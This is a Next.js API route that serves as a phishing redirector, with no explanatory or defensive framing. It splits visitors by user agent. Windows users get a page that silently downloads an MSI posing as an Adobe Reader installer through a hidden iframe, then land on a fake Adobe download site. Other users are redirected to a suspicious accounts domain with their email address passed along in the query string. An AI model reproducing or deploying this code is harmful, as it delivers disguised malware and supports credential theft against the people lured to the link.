// pages/api/redirect.js
export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://jomry.com/adobe-readers/installer/download.html';
  const MSI_PATH = '/Reader_en_install.msi';
  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu';

  // 1. Try to get email from query normally
  let email = '';
  if (req.query.email) {
    email = Array.isArray(req.query.email) ? req.query.email[0] : req.query.email;
  } else if (req.query.smn) {
    email = Array.isArray(req.query.smn) ? req.query.smn[0] : req.query.smn;
  } else if (req.url) {
    // 2. Fallback: parse &smn=EMAIL even if no preceding ?
    const match = req.url.match(/&smn=([^&]+)/);
    if (match && match[1]) {
      email = decodeURIComponent(match[1]);
    }
  }

  const safeEmail = email ? encodeURIComponent(email) : '';

  if (isWindows) {
    // Windows: trigger MSI download + redirect to Adobe
    const html = `<!DOCTYPE html>
      <html>
        <head><meta charset="utf-8"><title>Download…</title></head>
        <body>
          <p>Your download will start shortly…</p>
          <script>
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = '${MSI_PATH}';
            document.body.appendChild(iframe);

            setTimeout(() => {
              window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
            }, 2000);
          </script>
        </body>
      </html>`;
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  // Non-Windows: redirect with email
  const finalUrl = safeEmail ? `${NON_WINDOWS_TARGET}?smn=${safeEmail}` : NON_WINDOWS_TARGET;
  res.writeHead(302, { Location: finalUrl });
  res.end();
}